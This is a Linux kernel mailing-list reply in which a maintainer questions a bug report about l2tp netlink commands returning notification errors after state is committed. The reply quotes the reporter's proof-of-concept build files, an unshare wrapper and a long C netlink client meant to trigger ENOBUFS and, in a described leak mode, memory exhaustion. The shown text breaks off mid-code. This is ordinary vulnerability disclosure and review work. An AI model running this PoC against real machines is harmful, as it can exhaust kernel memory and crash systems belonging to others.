Received: from mail.katalix.com (mail.katalix.com [3.9.82.81])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EA6723DDB07;
	Tue, 25 Aug 2026 08:27:56 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=3.9.82.81
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1787646481; cv=none; b=FdNvj5y+FiCK19X+Kyv8LTK6CtXKy2xTo8xDfQIEG9z/FOfLYXlV8c/ll2rpyzic9lpt5twLjaw8CZk2GB24yKpmj+wGgyo47sQxSWVqEM7GUpReFe7fy8KHB4R3/uydVNmHm2uBfOjX2JOo6TKnMvCZDi2aLZ0N1DxW6uAK0Wg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1787646481; c=relaxed/simple;
	bh=XjRM9iZZISo3fpu+QVQbq/cURDNRoPdua6vkULm7wio=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=QLXwNKwyDp3ES7rYXz5VaAeKvXUaWzccmPS5zeE7KyDepgy/60o7AkkfZYJtEzLhLOZwb4dUbdpuWPcj/e1puEfDztgZ+gOEJy5plwk33JfmAFk3O/7nwSa+efAs2QVp7wsoogiqLt7IHFUMgEd4X8YWTwfcZ40PjSavtRW69d4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=katalix.com; spf=pass smtp.mailfrom=katalix.com; dkim=pass (2048-bit key) header.d=katalix.com header.i=@katalix.com header.b=Qo8LJNKG; arc=none smtp.client-ip=3.9.82.81
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=katalix.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=katalix.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=katalix.com header.i=@katalix.com header.b="Qo8LJNKG"
Received: from localhost (82-69-49-219.dsl.in-addr.zen.co.uk [82.69.49.219])
	(Authenticated sender: tom)
	by mail.katalix.com (Postfix) with ESMTPSA id CE55D7DEBE;
	Tue, 25 Aug 2026 09:20:02 +0100 (BST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=katalix.com; s=mail;
	t=1787646002; bh=XjRM9iZZISo3fpu+QVQbq/cURDNRoPdua6vkULm7wio=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Disposition:In-Reply-To:From;
	z=Date:=20Tue,=2025=20Aug=202026=2009:20:02=20+0100|From:=20Tom=20P
	 arkin=20<tparkin@katalix.com>|To:=20Zihan=20Xi=20<zihanx@nebusec.a
	 i>|Cc:=20netdev@vger.kernel.org,=20davem@davemloft.net,=20edumazet
	 @google.com,=0D=0A=09kuba@kernel.org,=20pabeni@redhat.com,=20horms
	 @kernel.org,=0D=0A=09bhong@brocade.com,=20stephen@networkplumber.o
	 rg,=20sven@brocade.com,=0D=0A=09linux-kernel@vger.kernel.org|Subje
	 ct:=20Re:=20[PATCH=20net=200/1]=20net:=20l2tp:=20ignore=20multicas
	 t=20notification=20errors=0D=0A=20in=20netlink=20commands|Message-
	 ID:=20<ao1QMuGwSzhtlmo5@katalix.com>|References:=20<cover.17869622
	 20.git.zihanx@nebusec.ai>|MIME-Version:=201.0|Content-Disposition:
	 =20inline|In-Reply-To:=20<cover.1786962220.git.zihanx@nebusec.ai>;
	b=Qo8LJNKGATQCUcHBDDDBGubPpHUW7RWGPaQXT3X9AP7LWb0oaeLDmbiiLShwSl1bC
	 qZKIV+oNuF3dDog0fB4CuimLERC0gQ+j84uf0QszdE7Z8qQjowz862UbTgor3gJPrV
	 x5ZWsu+GsGr9RceRluWXfucKtVHPIRey+1BaW8S1VKFdnJCxNYSv5PNCQuwDnN22T4
	 kmWRD34EeVH/dp9yLVD5Ip6EM1vSv7DiPF6+w5sjXaDbzFMpEbBj6YrbU9pq6O5pvg
	 R6T/ZmDUrwf2sbsEHO6Qgr4dutoXmQLwyh13/kaoBP3ra68nfdHyLvgfaxkmesasmt
	 gudcZEF7oZmjA==
Date: Tue, 25 Aug 2026 09:20:02 +0100
From: Tom Parkin <tparkin@katalix.com>
To: Zihan Xi <zihanx@nebusec.ai>
Cc: netdev@vger.kernel.org, davem@davemloft.net, edumazet@google.com,
	kuba@kernel.org, pabeni@redhat.com, horms@kernel.org,
	bhong@brocade.com, stephen@networkplumber.org, sven@brocade.com,
	linux-kernel@vger.kernel.org
Subject: Re: [PATCH net 0/1] net: l2tp: ignore multicast notification errors
 in netlink commands
Message-ID: <ao1QMuGwSzhtlmo5@katalix.com>
References: <cover.1786962220.git.zihanx@nebusec.ai>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="UO1CyJLmmzewn7DP"
Content-Disposition: inline
In-Reply-To: <cover.1786962220.git.zihanx@nebusec.ai>


--UO1CyJLmmzewn7DP
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On  Mon, Aug 17, 2026 at 16:53:17 +0000, Zihan Xi wrote:
> Hi Linux kernel maintainers,
>=20
> We found and validated a issue in net/l2tp/l2tp_netlink.c. The bug is rea=
chable by a
> non-root user via user and net namespace.
> Here, that reachability statement refers to the finite state-commit trigg=
er;
> the OOM transcript below is a separate root initramfs leak-mode run (UID =
0,
> PID 1) used to make the leak and panic deterministic.
> We've tested it, and it should not affect any other functionality.
> Regression coverage includes the root namespace and an unprivileged user/=
net
> namespace, with notification-queue pressure and successful ACK paths for =
all
> three commands; no broader regression suite was run.
> The finite fixed-kernel runs returned ACK success for all three commands =
in
> both namespaces. The leak run returned ENOBUFS and reached OOM after 41984
> hidden Ethernet sessions.

I think the underlying point about allowing l2tp_tunnel_notify and
l2tp_session_notify to impact the return from l2tp_nl_cmd_tunnel_create
and l2tp_nl_cmd_tunnel_create is not unreasonable.

IMO it seems relatively silly to allow the notification to cause an error
response to be indicated to userspace for the create command when in
fact the instance creation was otherwise successful.

That said, I think it would be worth clarifying the behaviour around
the "hidden" tunnel and session.  From my reading of the code, at the
point that the nl notification function is called in both tunnel and
session instantiation, the kernel has already performed checks on
input arguments, allocated the instance, and registered it.  Even if
the l2tp code then returns an error to userspace, the instance is
present in the kernel's tracking structures.  I would expect that if
one then listed tunnel and session instances the new instance would
show up.

That being the case, it's not accurate IMO to say that the tunnel or
session instance is leaked, and the fact that you can cause OOM by
continuing to allocate new tunnel and session instances with new IDs
isn't surprising.

I may be misreading the code, and if so I apologise, but if after
hitting the ENOBUFS error case the "ip l2tp show [tunnel|session]"
output is consistent, and the newly created instance appears, then
there's no leak per-se IMO, and the eventual OOM is as expected.

>=20
> We will provide detailed information about the bug
> in this email, along with a PoC to trigger it.
>=20
> ---- details below ----
>=20
> Bug details:
>=20
> The tunnel create, session create, and session modify generic-netlink han=
dlers
> update live L2TP state before sending their multicast notifications. The
> l2tp_tunnel_notify() and l2tp_session_notify() helpers can return -ENOBUFS
> when a subscribed listener has a full receive queue and NETLINK_BROADCAST=
_ERROR
> is enabled. The helpers can also fail while allocating or encoding the
> notification message. The handlers previously assigned any such best-effo=
rt
> notification result to the command return value after the state change had
> already taken effect. This produced a failure response for an operation t=
hat had
> committed, allowing retries to accumulate live Ethernet sessions and netd=
evices
> while the committed tunnel remained live.
>=20
> The fix keeps sending the notifications but ignores their best-effort res=
ult
> in the three handlers, so the command result continues to describe the st=
ate
> changing operation rather than the listener's queue state.
>=20
> The PoC accepts either ENOBUFS or success from session_modify and verifie=
s the
> post-modify state in both cases; it reports the actual return value.
>=20
> The underlying notification return-value coupling was introduced by the c=
ommit
> listed in Fixes:. Later changes may broaden the trigger surface, but the
> root-cause fact is the overwrite of a committed command result by a best-=
effort
> multicast notification error.
>=20
> Reproducer:
>=20
>     gcc -O2 -static -o poc poc.c
>     unshare -Urn ./poc
>=20
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
>=20
> The finite command above verifies the committed-state behavior. The OOM
> crash log below was produced by the leak mode in the QEMU initramfs:
>=20
>     /poc-original --leak-forever
>=20
> The initramfs opens /proc/sys/vm/panic_on_oom and writes "2\n" before
> execve() when the sysctl is available. The panic message below confirms t=
hat
> panic_on_oom=3D2 was active; the exact init source is included below.
>=20
> ------BEGIN Makefile------
> CC ?=3D gcc
> CFLAGS ?=3D -O2 -Wall -Wextra
>=20
> all: poc
>=20
> poc: poc.c
> 	$(CC) $(CFLAGS) poc.c -o poc
>=20
> clean:
> 	rm -f poc
> ------END Makefile--------
>=20
> ------BEGIN poc.sh------
> #!/bin/sh
> set -eu
>=20
> DIR=3D$(CDPATH=3D cd -- "$(dirname -- "$0")" && pwd)
> RUN_IN_USERNS=3D0
> POC_ARG=3D
>=20
> if [ "${1-}" =3D "--namespace" ]; then
> 	RUN_IN_USERNS=3D1
> 	shift
> fi
>=20
> if [ "$#" -gt 1 ]; then
> 	echo "usage: $0 [--namespace] [--leak-forever]" >&2
> 	exit 1
> fi
>=20
> if [ "$#" -eq 1 ]; then
> 	POC_ARG=3D" $1"
> fi
>=20
> cd "$DIR"
> make
>=20
> if [ "$RUN_IN_USERNS" -eq 1 ]; then
> 	exec unshare -Urn sh -exc "ip link set lo up; cd '$DIR'; ./poc$POC_ARG"
> fi
>=20
> ip link set lo up >/dev/null 2>&1 || true
> exec ./poc "$@"
> ------END poc.sh--------
>=20
> ------BEGIN poc.c------
> #define _GNU_SOURCE
>=20
> #include <arpa/inet.h>
> #include <errno.h>
> #include <inttypes.h>
> #include <linux/genetlink.h>
> #include <linux/l2tp.h>
> #include <linux/netlink.h>
> #include <net/if.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <sys/time.h>
> #include <sys/types.h>
> #include <unistd.h>
>=20
> #ifndef SOL_NETLINK
> #define SOL_NETLINK 270
> #endif
>=20
> #ifndef NLA_ALIGNTO
> #define NLA_ALIGNTO 4
> #endif
>=20
> #ifndef NLA_ALIGN
> #define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
> #endif
>=20
> #ifndef NLA_HDRLEN
> #define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
> #endif
>=20
> #ifndef NLA_DATA
> #define NLA_DATA(na) ((void *)((char *)(na) + NLA_HDRLEN))
> #endif
>=20
> #ifndef NLA_NEXT
> #define NLA_NEXT(na, attrlen) \
> 	((attrlen) -=3D NLA_ALIGN((na)->nla_len), \
> 	 (struct nlattr *)(((char *)(na)) + NLA_ALIGN((na)->nla_len)))
> #endif
>=20
> #ifndef NLA_OK
> #define NLA_OK(na, len) \
> 	((len) >=3D (int)sizeof(struct nlattr) && \
> 	 (na)->nla_len >=3D sizeof(struct nlattr) && \
> 	 (na)->nla_len <=3D (len))
> #endif
>=20
> #define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
> #define MAX_BUF 8192
> #define CTRL_BUF 4096
>=20
> struct nl_socket {
> 	int fd;
> 	uint32_t portid;
> 	uint32_t seq;
> };
>=20
> struct l2tp_family {
> 	uint16_t family_id;
> 	uint32_t mcgrp_id;
> };
>=20
> struct tunnel_info {
> 	uint32_t tunnel_id;
> 	uint32_t peer_tunnel_id;
> 	uint16_t udp_sport;
> 	uint16_t udp_dport;
> };
>=20
> struct session_info {
> 	uint32_t tunnel_id;
> 	uint32_t session_id;
> 	uint32_t peer_session_id;
> 	uint8_t recv_seq;
> 	uint8_t send_seq;
> 	uint8_t lns_mode;
> 	char ifname[IFNAMSIZ];
> };
>=20
> static void die_ret(const char *what, int ret)
> {
> 	fprintf(stderr, "%s: %s (%d)\n", what, strerror(-ret), ret);
> 	exit(EXIT_FAILURE);
> }
>=20
> static int nl_open(struct nl_socket *sock)
> {
> 	struct sockaddr_nl addr =3D {0};
> 	struct timeval tv =3D {
> 		.tv_sec =3D 3,
> 		.tv_usec =3D 0,
> 	};
> 	socklen_t addrlen =3D sizeof(addr);
>=20
> 	sock->fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
> 	if (sock->fd < 0)
> 		return -errno;
>=20
> 	addr.nl_family =3D AF_NETLINK;
> 	if (bind(sock->fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
> 		return -errno;
>=20
> 	if (getsockname(sock->fd, (struct sockaddr *)&addr, &addrlen) < 0)
> 		return -errno;
>=20
> 	if (setsockopt(sock->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
> 		return -errno;
>=20
> 	sock->portid =3D addr.nl_pid;
> 	sock->seq =3D 1;
> 	return 0;
> }
>=20
> static void nl_close(struct nl_socket *sock)
> {
> 	if (sock->fd >=3D 0)
> 		close(sock->fd);
> 	sock->fd =3D -1;
> }
>=20
> static int nla_put_raw(char *buf, size_t buflen, size_t *offset, uint16_t=
 type,
> 		       const void *data, size_t len)
> {
> 	struct nlattr *nla;
> 	size_t total =3D NLA_HDRLEN + len;
> 	size_t aligned =3D NLA_ALIGN(total);
>=20
> 	if (*offset + aligned > buflen)
> 		return -ENOSPC;
>=20
> 	nla =3D (struct nlattr *)(buf + *offset);
> 	nla->nla_type =3D type;
> 	nla->nla_len =3D total;
> 	memcpy(NLA_DATA(nla), data, len);
> 	if (aligned > total)
> 		memset(buf + *offset + total, 0, aligned - total);
> 	*offset +=3D aligned;
> 	return 0;
> }
>=20
> static int nla_put_u8(char *buf, size_t buflen, size_t *offset, uint16_t =
type, uint8_t value)
> {
> 	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
> }
>=20
> static int nla_put_u16(char *buf, size_t buflen, size_t *offset, uint16_t=
 type, uint16_t value)
> {
> 	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
> }
>=20
> static int nla_put_u32(char *buf, size_t buflen, size_t *offset, uint16_t=
 type, uint32_t value)
> {
> 	return nla_put_raw(buf, buflen, offset, type, &value, sizeof(value));
> }
>=20
> static int nla_put_string(char *buf, size_t buflen, size_t *offset, uint1=
6_t type,
> 			  const char *value)
> {
> 	return nla_put_raw(buf, buflen, offset, type, value, strlen(value) + 1);
> }
>=20
> static int nl_send(struct nl_socket *sock, const void *buf, size_t len)
> {
> 	struct sockaddr_nl dst =3D {
> 		.nl_family =3D AF_NETLINK,
> 	};
> 	struct iovec iov =3D {
> 		.iov_base =3D (void *)buf,
> 		.iov_len =3D len,
> 	};
> 	struct msghdr msg =3D {
> 		.msg_name =3D &dst,
> 		.msg_namelen =3D sizeof(dst),
> 		.msg_iov =3D &iov,
> 		.msg_iovlen =3D 1,
> 	};
>=20
> 	if (sendmsg(sock->fd, &msg, 0) < 0)
> 		return -errno;
> 	return 0;
> }
>=20
> static int nl_recv(struct nl_socket *sock, char *buf, size_t buflen, ssiz=
e_t *out_len)
> {
> 	ssize_t len;
>=20
> 	len =3D recv(sock->fd, buf, buflen, 0);
> 	if (len < 0)
> 		return -errno;
> 	*out_len =3D len;
> 	return 0;
> }
>=20
> static int nl_wait_ack(struct nl_socket *sock, uint32_t seq)
> {
> 	char buf[MAX_BUF];
> 	ssize_t len;
> 	struct nlmsghdr *nlh;
> 	int ret;
>=20
> 	ret =3D nl_recv(sock, buf, sizeof(buf), &len);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh =3D (struct nlmsghdr *)buf;
> 	if (nlh->nlmsg_seq !=3D seq)
> 		return -EPROTO;
>=20
> 	if (nlh->nlmsg_type !=3D NLMSG_ERROR)
> 		return -EPROTO;
>=20
> 	return ((struct nlmsgerr *)NLMSG_DATA(nlh))->error;
> }
>=20
> static int nl_request_reply(struct nl_socket *sock, void *req, size_t req=
_len,
> 			    uint32_t seq, char *reply, size_t reply_len,
> 			    ssize_t *reply_size)
> {
> 	struct nlmsghdr *nlh;
> 	int ret;
>=20
> 	ret =3D nl_send(sock, req, req_len);
> 	if (ret < 0)
> 		return ret;
>=20
> 	ret =3D nl_recv(sock, reply, reply_len, reply_size);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh =3D (struct nlmsghdr *)reply;
> 	if (nlh->nlmsg_seq !=3D seq)
> 		return -EPROTO;
>=20
> 	if (nlh->nlmsg_type =3D=3D NLMSG_ERROR)
> 		return ((struct nlmsgerr *)NLMSG_DATA(nlh))->error;
>=20
> 	return 0;
> }
>=20
> static uint16_t nla_get_u16(const struct nlattr *nla)
> {
> 	uint16_t value;
>=20
> 	memcpy(&value, NLA_DATA(nla), sizeof(value));
> 	return value;
> }
>=20
> static uint32_t nla_get_u32(const struct nlattr *nla)
> {
> 	uint32_t value;
>=20
> 	memcpy(&value, NLA_DATA(nla), sizeof(value));
> 	return value;
> }
>=20
> static uint8_t nla_get_u8(const struct nlattr *nla)
> {
> 	uint8_t value;
>=20
> 	memcpy(&value, NLA_DATA(nla), sizeof(value));
> 	return value;
> }
>=20
> static int resolve_l2tp_family(struct nl_socket *sock, struct l2tp_family=
 *family)
> {
> 	char req[CTRL_BUF] =3D {0};
> 	char reply[CTRL_BUF];
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	struct nlattr *nla;
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	ssize_t reply_len;
> 	uint32_t seq =3D sock->seq++;
> 	int rem;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D GENL_ID_CTRL;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D CTRL_CMD_GETFAMILY;
> 	genlh->version =3D 1;
>=20
> 	ret =3D nla_put_string(req, sizeof(req), &offset, CTRL_ATTR_FAMILY_NAME,
> 			     L2TP_GENL_NAME);
> 	if (ret < 0)
> 		return ret;
> 	nlh->nlmsg_len =3D offset;
>=20
> 	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(r=
eply),
> 			       &reply_len);
> 	if (ret < 0)
> 		return ret;
>=20
> 	memset(family, 0, sizeof(*family));
>=20
> 	nlh =3D (struct nlmsghdr *)reply;
> 	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
> 	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
> 	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
>=20
> 	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
> 		if (nla->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) {
> 			family->family_id =3D nla_get_u16(nla);
> 			continue;
> 		}
> 		if (nla->nla_type =3D=3D CTRL_ATTR_MCAST_GROUPS) {
> 			struct nlattr *grp =3D (struct nlattr *)NLA_DATA(nla);
> 			int grem =3D nla->nla_len - NLA_HDRLEN;
>=20
> 			for (; NLA_OK(grp, grem); grp =3D NLA_NEXT(grp, grem)) {
> 				struct nlattr *entry =3D (struct nlattr *)NLA_DATA(grp);
> 				int erem =3D grp->nla_len - NLA_HDRLEN;
> 				const char *name =3D NULL;
> 				uint32_t id =3D 0;
>=20
> 				for (; NLA_OK(entry, erem); entry =3D NLA_NEXT(entry, erem)) {
> 					if (entry->nla_type =3D=3D CTRL_ATTR_MCAST_GRP_NAME)
> 						name =3D (const char *)NLA_DATA(entry);
> 					else if (entry->nla_type =3D=3D CTRL_ATTR_MCAST_GRP_ID)
> 						id =3D nla_get_u32(entry);
> 				}
>=20
> 				if (name && strcmp(name, L2TP_GENL_MCGROUP) =3D=3D 0)
> 					family->mcgrp_id =3D id;
> 			}
> 		}
> 	}
>=20
> 	if (!family->family_id || !family->mcgrp_id)
> 		return -ENOENT;
> 	return 0;
> }
>=20
> static int blocker_setup(struct nl_socket *sock, uint32_t mcgrp_id)
> {
> 	int one =3D 1;
> 	int rcvbuf =3D 4096;
>=20
> 	if (setsockopt(sock->fd, SOL_NETLINK, NETLINK_BROADCAST_ERROR,
> 		       &one, sizeof(one)) < 0)
> 		return -errno;
> 	if (setsockopt(sock->fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf))=
 < 0)
> 		return -errno;
> 	if (setsockopt(sock->fd, SOL_NETLINK, NETLINK_ADD_MEMBERSHIP,
> 		       &mcgrp_id, sizeof(mcgrp_id)) < 0)
> 		return -errno;
> 	return 0;
> }
>=20
> static int l2tp_tunnel_create(struct nl_socket *sock, uint16_t family_id,
> 			      uint32_t tunnel_id, uint32_t peer_tunnel_id,
> 			      uint16_t udp_sport, uint16_t udp_dport)
> {
> 	char req[MAX_BUF] =3D {0};
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	uint32_t seq =3D sock->seq++;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_TUNNEL_CREATE;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_PEER_CON=
N_ID,
> 				 peer_tunnel_id);
> 	ret =3D ret ?: nla_put_u8(req, sizeof(req), &offset, L2TP_ATTR_PROTO_VER=
SION, 3);
> 	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_ENCAP_TY=
PE,
> 				 L2TP_ENCAPTYPE_UDP);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_IP_SADDR,
> 				 inet_addr("127.0.0.1"));
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_IP_DADDR,
> 				 inet_addr("127.0.0.1"));
> 	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_UDP_SPOR=
T,
> 				 udp_sport);
> 	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_UDP_DPOR=
T,
> 				 udp_dport);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	ret =3D nl_send(sock, req, nlh->nlmsg_len);
> 	if (ret < 0)
> 		return ret;
> 	return nl_wait_ack(sock, seq);
> }
>=20
> static int l2tp_tunnel_get(struct nl_socket *sock, uint16_t family_id,
> 			   uint32_t tunnel_id, struct tunnel_info *info)
> {
> 	char req[MAX_BUF] =3D {0};
> 	char reply[MAX_BUF];
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	struct nlattr *nla;
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	ssize_t reply_len;
> 	uint32_t seq =3D sock->seq++;
> 	int rem;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_TUNNEL_GET;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	if (ret < 0)
> 		return ret;
> 	nlh->nlmsg_len =3D offset;
>=20
> 	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(r=
eply),
> 			       &reply_len);
> 	if (ret < 0)
> 		return ret;
>=20
> 	memset(info, 0, sizeof(*info));
> 	nlh =3D (struct nlmsghdr *)reply;
> 	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
> 	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
> 	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
>=20
> 	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
> 		switch (nla->nla_type) {
> 		case L2TP_ATTR_CONN_ID:
> 			info->tunnel_id =3D nla_get_u32(nla);
> 			break;
> 		case L2TP_ATTR_PEER_CONN_ID:
> 			info->peer_tunnel_id =3D nla_get_u32(nla);
> 			break;
> 		case L2TP_ATTR_UDP_SPORT:
> 			info->udp_sport =3D nla_get_u16(nla);
> 			break;
> 		case L2TP_ATTR_UDP_DPORT:
> 			info->udp_dport =3D nla_get_u16(nla);
> 			break;
> 		default:
> 			break;
> 		}
> 	}
>=20
> 	if (info->tunnel_id !=3D tunnel_id)
> 		return -ENOENT;
> 	return 0;
> }
>=20
> static int l2tp_session_create(struct nl_socket *sock, uint16_t family_id,
> 			       uint32_t tunnel_id, uint32_t session_id,
> 			       uint32_t peer_session_id, const char *ifname)
> {
> 	char req[MAX_BUF] =3D {0};
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	uint32_t seq =3D sock->seq++;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_SESSION_CREATE;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_=
ID,
> 				 session_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset,
> 				 L2TP_ATTR_PEER_SESSION_ID, peer_session_id);
> 	ret =3D ret ?: nla_put_u16(req, sizeof(req), &offset, L2TP_ATTR_PW_TYPE,
> 				 L2TP_PWTYPE_ETH);
> 	ret =3D ret ?: nla_put_string(req, sizeof(req), &offset, L2TP_ATTR_IFNAM=
E,
> 				    ifname);
> 	if (ret < 0)
> 		return ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	ret =3D nl_send(sock, req, nlh->nlmsg_len);
> 	if (ret < 0)
> 		return ret;
> 	return nl_wait_ack(sock, seq);
> }
>=20
> static int l2tp_session_get(struct nl_socket *sock, uint16_t family_id,
> 			    uint32_t tunnel_id, uint32_t session_id,
> 			    struct session_info *info)
> {
> 	char req[MAX_BUF] =3D {0};
> 	char reply[MAX_BUF];
> 	struct nlmsghdr *nlh =3D (struct nlmsghdr *)req;
> 	struct genlmsghdr *genlh =3D (struct genlmsghdr *)(req + NLMSG_HDRLEN);
> 	struct nlattr *nla;
> 	size_t offset =3D NLMSG_HDRLEN + GENL_HDRLEN;
> 	ssize_t reply_len;
> 	uint32_t seq =3D sock->seq++;
> 	int rem;
> 	int ret;
>=20
> 	nlh->nlmsg_len =3D offset;
> 	nlh->nlmsg_type =3D family_id;
> 	nlh->nlmsg_flags =3D NLM_F_REQUEST;
> 	nlh->nlmsg_seq =3D seq;
>=20
> 	genlh->cmd =3D L2TP_CMD_SESSION_GET;
> 	genlh->version =3D L2TP_GENL_VERSION;
>=20
> 	ret =3D nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_CONN_ID, tunnel=
_id);
> 	ret =3D ret ?: nla_put_u32(req, sizeof(req), &offset, L2TP_ATTR_SESSION_=
ID,
> 				 session_id);
> 	if (ret < 0)
> 		return ret;
> 	nlh->nlmsg_len =3D offset;
>=20
> 	ret =3D nl_request_reply(sock, req, nlh->nlmsg_len, seq, reply, sizeof(r=
eply),
> 			       &reply_len);
> 	if (ret < 0)
> 		return ret;
>=20
> 	memset(info, 0, sizeof(*info));
> 	nlh =3D (struct nlmsghdr *)reply;
> 	genlh =3D (struct genlmsghdr *)(reply + NLMSG_HDRLEN);
> 	nla =3D (struct nlattr *)((char *)genlh + GENL_HDRLEN);
> 	rem =3D nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
>=20
> 	for (; NLA_OK(nla, rem); nla =3D NLA_NEXT(nla, rem)) {
> 		switch (nla->nla_type) {
> 		case L2TP_ATTR_CONN_ID:
> 			info->tunnel_id =3D nla_get_u32(nla);
> 			break;
> 		case L2TP_ATTR_SESSION_ID:
> 			info->session_id =3D nla_get_u32(nla);
> 			break;
> 		case L2TP_ATTR_PEER_SESSION_ID:
> 			info->peer_session_id =3D nla_get_u32(nla);
> 			break;
> 		case L2TP_ATTR_RECV_SEQ:
> 			info->recv_seq =3D nla_get_u8(nla);
> 			break;
> 		case L2TP_ATTR_SEND_SEQ:
> 			info->send_seq =3D nla_get_u8(nla);
> 			break;
> 		case L2TP_ATTR_LNS_MODE:
